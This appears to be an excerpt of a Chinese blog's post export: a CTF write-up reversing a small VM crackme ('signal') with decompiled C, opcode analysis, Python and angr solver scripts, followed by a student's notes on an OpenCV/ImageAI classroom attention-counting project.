0;\n}\n```\n\n不管别的，把`&unk_403040`的值扣下来再说\n\n\n\n![](https://i.loli.net/2020/06/14/TWOQHMdemzoRqYb.png)\n\n主函数做的是先把`&unk_403040`的值赋给`&v4`，然后进入`vm_operad`函数\n\n```c\nint __cdecl vm_operad(int *a1, int a2)\n{\n  int result; // eax\n  char v3[100]; // [esp+13h] [ebp-E5h]\n  char v4[100]; // [esp+77h] [ebp-81h]\n  char v5; // [esp+DBh] [ebp-1Dh]\n  int v6; // [esp+DCh] [ebp-1Ch]\n  int v7; // [esp+E0h] [ebp-18h]\n  int v8; // [esp+E4h] [ebp-14h]\n  int v9; // [esp+E8h] [ebp-10h]\n  int v10; // [esp+ECh] [ebp-Ch]\n\n  v10 = 0;\n  v9 = 0;\n  v8 = 0;\n  v7 = 0;\n  v6 = 0;\n  while ( 1 )\n  {\n    result = v10;\n    if ( v10 >= a2 )\n      return result;\n    switch ( a1[v10] )\n    {\n      case 1:\n        v4[v7] = v5;\n        ++v10;\n        ++v7;\n        ++v9;\n        break;\n      case 2:\n        v5 = a1[v10 + 1] + v3[v9];\n        v10 += 2;\n        break;\n      case 3:\n        v5 = v3[v9] - LOBYTE(a1[v10 + 1]);\n        v10 += 2;\n        break;\n      case 4:\n        v5 = a1[v10 + 1] ^ v3[v9];\n        v10 += 2;\n        break;\n      case 5:\n        v5 = a1[v10 + 1] * v3[v9];\n        v10 += 2;\n        break;\n      case 6:\n        ++v10;\n        break;\n      case 7:\n        if ( v4[v8] != a1[v10 + 1] )\n        {\n          printf(\"what a shame...\");\n          exit(0);\n        }\n        ++v8;\n        v10 += 2;\n        break;\n      case 8:\n        v3[v6] = v5;\n        ++v10;\n        ++v6;\n        break;\n      case 10:\n        read(v3);\n        ++v10;\n        break;\n      case 11:\n        v5 = v3[v9] - 1;\n        ++v10;\n        break;\n      case 12:\n        v5 = v3[v9] + 1;\n        ++v10;\n        break;\n      default:\n        continue;\n    }\n  }\n}\n```\n\n第一次见，感觉这么多数一定很麻烦，但其实如果理解了其中的操作并不难\n\n粗略的看一下，有 what a shame 这样的字符串，所以应该是要比较字符\n\n再仔细分析程序，switch 这里用的参数是 a1（0x403040的值），v10 相当于是索引，从0开始递增，\n\n进而遍历 0x403040之后的所有数（四字节为单位）。\n\n所以说 0x403040 这里面储存的都是操作数，然后一个一个取出来，找相应的case进行操作。\n\n##特别要注意的是case7，操作码最后部分的07H都是进行比较用的\n\n![image-20200614135000672](https://i.loli.net/2020/06/14/2mfMaRsH1nxLw5e.png)\n\n------\n\n接下来只要根据相应的操作数一步一步分析，\n\n首先通过分析知道，a1是存入的操作数，v3是你输入的字符，v4，v5用于暂存数据\n\n```c\ncase1：进行赋值操作，将v5的值赋给v4，标号索引全加1  \n//后面可以知道v4内数据用来作最后的比较\ncase2：v3与a1的下一个值相加，索引加2（跳过用于运算的数值）\ncase3：v3减去a1的下一个值，索引加2\ncase4：a1的下一个数值与v3异或，索引加2\ncase5：a1下一个数值与v3相乘，索引加2\ncase6：空操作\ncase7：v4的数值分别与a1的下一个数值进行比较，全正确则通过\ncase8：相当于一个复制操作，保存当前值\ncase9：刚发现没有case9\ncase10：输入15位数值，放在v3中\ncase11：v3-1\ncase12：v3+1\n```\n\n了解了全部操作，那么就可以分析它的实现流程了\n\n## 0x02 实现流程\n\n对照着`0x403040`的数据可以一步一步摸清它的脉络\n\n首先第一个操作码是10，是输入15位数据（也就是要求的flag）\n\n下一个操作码是4，flag[0]与a1的下一个数值（16）进行异或，索引加2\n\n下一个操作码是8，保存当前状态。\n\n下一个操作码是3，当前值减去a1下一个数据（5）\n\n下一个操作码是1，将现在的数据赋值给v4，各个索引均加1\n\n进行对下一位flag[1]的运算操作\n\n所以可以从中找出规律，对于每一位数据的操作都结束于case1，也就是说，程序是将flag[0~14]这15位数据依次作运算，存入v4中，最后将v4的数值分别与对应的数值进行比较\n\n------\n\n## 0x03 脚本\n\n**1.手撕程序**\n\n那么可以动笔来算一下，~~写的有点乱，无伤大雅，勉强能冲~~。\n\n![image-20200614133839058](https://i.loli.net/2020/06/14/vFeAPrMR5ZzUtc8.png)\n\n由于题目的位数不多，逻辑不难，所以手撕还是挺快~~（乐）~~的，贴上代码\n\n\n\n```python\nprint (chr((34+5)^16),end='')\nprint (chr((63//3)^32),end='')\nprint (chr(52+2+1),end='')\nprint (chr((50^4)-1),end='')\nprint (chr((114+33)//3),end='')\nprint (chr(51+1+1),end='')\nprint (chr((24+32)^9),end='')\nprint (chr((167^36)-81),end='')\nprint (chr(49+1-1),end='')\nprint (chr((241-37)//2),end='')\nprint (chr((40^65)-54),end='')\nprint (chr(132-32),end='')\nprint (chr((193-37)//3),end='')\nprint (chr((30+32)^9),end='')\nprint (chr(122-1-65))\n\n##疯狂print，虽然看上去很low，但简单粗暴，效率很高\n```\n\n**2.~~高级~~脚本**\n\n基本的逆向思维\n\n![image-20200614145058127](https://i.loli.net/2020/06/14/udbCneJyRa9hYHN.png)\n\n找出v4的值，分别反向做逆运算就可以找出flag\n\n```python\nv4 = [34,63,52,50,114,51,24,167,49,241,40,132,193,30,122]\nv4.reverse()\na=[10, 4, 16, 8, 3, 5, 1, 4, 32, 8, 5, 3, 1, 3, 2, 8, 11, 1, 12, 8, 4, 4, 1, 5, 3, 8, 3, 33, 1, 11, 8, 11, 1, 4, 9, 8, 3, 32, 1, 2, 81, 8, 4, 36, 1, 12, 8, 11, 1, 5, 2, 8, 2, 37, 1, 2, 54, 8, 4, 65, 1, 2, 32, 8, 5, 1, 1, 5, 3, 8, 2, 37, 1, 4, 9, 8, 3, 32, 1, 2, 65, 8, 12, 1]\na.reverse()\nv9=0\nv3=0#flag\nv5=0\nflag=[]\nfinal=''\nfor i in range(0,len(a)):\n    if i ==len(a)-1:\n        flag.append(v3)                   \n    if a[i]==1 and a[i-1]!=1:\n        v5 = v4[v9]\n        v9+=1\n        flag.append(v3)                    \n    if a[i]==2:\n        v3 = v5 - a[i-1]\n    if a[i]==3:\n        v3 = v5 + a[i-1] \n    if a[i]==4:                  \n        v3 = v5^a[i-1]\n    if a[i]==5:                 \n        v3 = int(v5/a[i-1])\n    if a[i]==8:\n        v5 = v3                            \n    if a[i]==11:\n        v3 = v5+1\n    if a[i]==12:\n        v3 = v5-1\nflag.reverse()\nfor j in flag:\n    final +=chr(j)\nprint (final)\n#看上去很高级，但....有这个时间手算不香吗\n```\n\n为了写的通俗易懂，脚本可能会存在考虑不周的地方，不过解出本题还是可以的\n\n附上队里一位[Han Xu小姐姐](https://hanxu-ideits.gitee.io/hanxuerr/)的脚本,比赛时就解出来是真的强，\n\n```python\nv1=[0xa,4,0x10,8,3,5,1,4,0x20,8,5,3,1,3,2,8,0xb,\n            1,0xc,8,4,4,1,5,3,8,3,0x21,1,0xb,0x8,0xb,1,4,9,8,3,\n            0x20,1,2,0x51,8,4,0x24,1,0xc,8,0xb,1,5,2,8,2,0x25,\n            1,2,0x36,8,4,0x41,1,2,0x20,8,5,1,5,3,8,2,0x25,\n            1,4,9,8,3,0x20,1,2,0x41,8,0xc,1,7,0x22,7,0x3f,7,\n            0x34,7,0x32,7,0x72,7,0x33,7,0x18,7,0xa7,\n            7,0x31,7,0xf1,7,0x28,7,0x84,\n            7,0xc1,7,0x1e,7,0x7a]\nprint(len(v1))   \nv4=[0]*15\nv3=[0]*15\nv7=0\nv9=15\nv6=14\nv4=[122, 30, 193, 132, 40, 241, 49, 167, 24, 51, 114, 50, 52, 63, 34]\nprint(len(v4))\nfor i in range(len(v1)-1,-1,-1):\n    if(v1[i]==1):\n        v5=v4[v7]\n        v7+=1\n        v9-=1\n    if(v1[i]==12):\n        v3[v9]=v5-1\n    if(v1[i]==11):\n        v3[v9]=v5+1\n    if(v1[i]==8):\n        v5=v3[v6]\n        v6-=1\n    if(v1[i]==2):\n        v3[v9]=v5-v1[i+1]\n    if(v1[i]==3):\n        v3[v9]=v5+v1[i+1]\n    if(v1[i]==4 ):\n        v3[v9]=v5^v1[i+1]\n    if(v1[i]==5):\n        v3[v9]=v5//v1[i+1]\n    else :\n        continue\nprint(v4)\nprint(v3)\nprint (\"\".join(chr(i) for i in v3))\n\n```\n\n**3.Angr**\n\nangr也叫符号执行暴力破解，用于解CTF题目，emmm实战中应该作用不大\n\n这一块是我的知识盲区，直接贴上[学习资源1](https://www.jianshu.com/p/5df6c4567a7d)、[学习资源2](https://www.secpulse.com/archives/83197.html)、[学习资源3](https://blog.csdn.net/whym1/article/details/78838026).......[学习资源N](https://github.com/angr/angr)，先记下来，以后慢慢看（咕咕咕）\n\n贴上大佬们的脚本\n\n```python\nimport angr\n\np = angr.Project('./signal.exe')   #指定angr跑的程序\nstate = p.factory.entry_state()    #新建一个SimState的对象，得到一个初始化到二进制入口函数的SimState对象。\nsimgr = p.factory.simgr(state)   #创建simulation manager，angr的主要入口\n\nsimgr.explore(find=0x004017A5 ,avoid=0x004016E6)  #争取跑到输出成功的地址，避免跑到输出wrong的地址\nflag = simgr.found[0].posix.dumps(0)[:15]     #得到flag\nprint(flag)\n\n--------------------------------------------------------------------------------\n#HanXu的脚本\nimport angr\np = angr.Project('./signal.exe')\nstate = p.factory.entry_state()\nsm = p.factory.simulation_manager(state)\ndef good(state):\n    return b\"good\" in state.posix.dumps(1)\n\ndef bad(state):\n    return b\"what\" in state.posix.dumps(1)\nsm.explore(find = good, avoid = bad)\nif sm.found:\n    find_state = sm.found[0]\nflag = find_state.posix.dumps(0)\nprint(flag)\n\n```\n\n运行结果：\n\n![image-20200614160910068](https://i.loli.net/2020/06/14/AvlxX4KD5fezk9m.png)\n\n------\n\n## 0x04 小结\n\n这可能是我赛后复现过的第一题，还是时隔了这么久。。。\n\n之前总感觉要从基础学起，从入门题慢慢进阶，后来发现进步速度实在缓慢，\n\n小结做一下简单的反思\n\n去翻一下[炜哥](https://ljzjsc.com/)的博客，发现他每次赛后都会写一篇博客复现一下当时没解出来的题目，\n\n我们英语课经常会讨论一些逆向的话题，他说必须要逼着自己做一些难题，大家一开始都不会，就是通过每一次复现题目来强制自己学习新的知识，否则会一直停留在入门水平。\n\n我目前的状态确实不像想学习的态度，比如说比赛题目只要没见过、或者很复杂，我很难静下心来解题，一般这种情况我会直接关掉网页，然后安慰自己，嗯...这题不是给我做的。\n\n逆向大佬[子洋](http://iyzyi.com/)、炜哥遇到巨难的题目会慢慢地啃，就算一道题目花费几天的时间，真正搞懂原理和逻辑也是值得的，说实话，这道signal题难度远不及他们的博客的平均水平，可以说是最简单的虚拟机题目（炜哥比赛手撕半个小时解决），虽然花了几个小时才搞懂，但还是很有成就感的\n\n张老师说过比赛和题目都不是关键，关键是你能从中学到什么，分清主次，明确学习规划才是当前最重要的\n\n好好学逆向，争取比赛不再只是去纠结MISC\n\n","tags":["CTF","vmre"],"categories":["REVERSE"]},{"title":"基于OpenCV的动态识别系统——随笔","url":"/2020/05/08/OpenCV/","content":"\n# 前言\n\n大一申报的大创项目，没办法自己申报的项目，哭着也得做完，总的来说真正开始搞得时间就是最后一个月\n\n这篇文章只是记录了我做项目时遇到的一些问题以及解决方案，不讨论具体实现和源码。\n\n## 项目简介\n\n基于OpenCV-python和python3.6的课堂动态识别系统，可自动估算教室人数，计算课堂抬头率（即专注度），并评定一节课的课堂质量。\n\n------\n\n### 一. 为什么用OpenCV-python而非OpenCV-C++：\n\n1. 主要原因是对于入门者来说困难，python相比于C++更简单，更容易理解。\n\n2. 薄弱的文档 ：C++文档很少会贴出代码的例子，以致于理解变得更加得困难。尽管贴出的代码有用，但是其也并非很好地被记录在文档中。#附上[OpenCV中文文档](http://woshicver.com/)\n\n3. 一个计算机视觉引擎时常需要大量的机器学习程序。然而，相比于 OpenCV（Python），OpenCV（C++）只含有一个小型的机器学习算法子集。\n\n4. python有了 **OpenCV**、 **numpy** 、 **scipy** 、 **scikit-learn** 以及 **matplotlib** ，在计算机视觉领域和机器学习领域，提供了一个学习和实验的强大环境。\n\n  #5. 其实我也尝试过api端口，亲测利用opencv-python可以实现。\n\n\n\n### 二. 为何在实现统计人数功能时不使用OpenCV：\n\n1. 统计人数时视频很卡顿。\n\n2. opencv只能识别正脸，当低头、侧脸时无法检测。（后面引进一个强大的工具`ImageAI`）\n\n3. 算法相对基础，实际应用误差大。（测试时3米以外很难识别，而imageai10米内问题不大）\n\n4. 本人对opencv相关知识掌握不到位，利用工具比较方便。\n\n\n\n### 三. 什么是ImageAI？\n\n  `ImageAI`是一个python库，旨在使开发人员能够使用简单的几行代码构建具有包含深度学习和计算机视觉功能的应用程序和系统。 ImageAI本着简洁的原则，支持最先进的机器学习算法，用于图像预测，自定义图像预测，物体检测，视频检测，视频对象跟踪和图像预测训练。ImageAI目前支持使用在ImageNet-1000数据集上训练的4种不同机器学习算法进行图像预测和训练。ImageAI还支持使用在COCO数据集上训练的RetinaNet进行对象检测，视频检测和对象跟踪。 最终，ImageAI将为计算机视觉提供更广泛和更专业化的支持，包括但不限于特殊环境和特殊领域的图像识别。\n\n#附上[ImageAI 中文文档](https://imageai-cn.readthedocs.io/zh_CN/latest/) , 幸运的是，基本用法介绍很详尽，可以放心学习。\n\n\n\n### 四.为什么用ImageAI？\n\n优点：深度学习库，训练模型样本大，不需要自己训练模型，算法简洁，节约时间精力，识别精确度。\n\n缺点：可以分析输入的图片视频，但无法实时检测监控中画面。\n\n（转换思路——固定间隔截取一帧画面，将视频分析转为对图片的分析，实现统计人数的作用）\n\n\n\n### 五.具体实现流程：\n\n1. 调出系统摄像头\n\n2. 通过Haar级联实时检测人脸（Haar 级联不具有旋转不变性，即不认为侧面照与正面照是相同的）\n\n3. 统计出正脸人数（视为专心听讲人数）\n\n4. 固定时间间隔截取一帧画面\n\n5. 利用imageai对图片进行分析，统计出总人数\n\n6. 总人数与正脸人数做差，计算出低头或转头的人数，视此部分人数即为听讲不专注人数\n\n7. 计算班级整体专注度，评价课堂质量\n\n\n\n### 六.克服困难及设计思路：\n\n  首先，预想的实时视频中分析与统计人数的实现相对困难: 此项目要求精准对相对较高，利用**opencv** **Haar级联**检测人脸精准度低且测试距离短，且运行后画面卡顿（不明原因），很难符合要求。\n\n  因此寻找到更强大的工具——**ImageAI**，它可以解决人不同姿势的识别问题，但是缺陷是不能通过摄像头对画面进行实时检测物体，于是转换思路，通过截取一帧画面，将视频分析问题转化为图片分析问题，进而实现人数的统计的功能。\n\n  上课的专注程度问题复杂，我尝试过通过**分析眨眼频率**来判断人是否困倦，事实证明当只分析一个人时功能正常实现（且只能分析正脸），但是这种算法无法做到多人实时检测。于是反向思维，即不分析睡觉的同学，而是分析认真听讲的同学，如果能统计出这一部分人，做差便是不专心的同学人数。于是利用**Haar级联精准度低**的特点，测出正脸人数，其余便是不专注学生数量（包括低头、转头或转身）。\n\n  设定课堂质量评价标准，以班级**专注度**为标准，专注度>85%，课堂质量为优；50%<专注度<85%，课堂质量为中；专注度<50%，课堂质量为差。\n\n\n\n### 七.存在的问题bug：\n\n1. 对于光线要求比较高，在昏暗条件下（如阴天）效果不好。\n\n2. 测试距离不足，对于面积大的教室效果欠佳。\n\n3. 学生的眼镜有一定干扰，带上眼镜后识别准确度会有所下降。\n\n4. 人数多而密集时，精准度也会大大降低。\n\n### 八.README.md：\n\n本项目利用 `OpenCV`、 `ImageAI` 和 `Python3` 完成，经测试适用于人数不多、采光较好的小教室。\n\n时间仓促，程序简陋，测试结果粗略，仅以学习为目的，仅供参考。","tags":["OpenCV"],"categories":["DEVELOP"]}]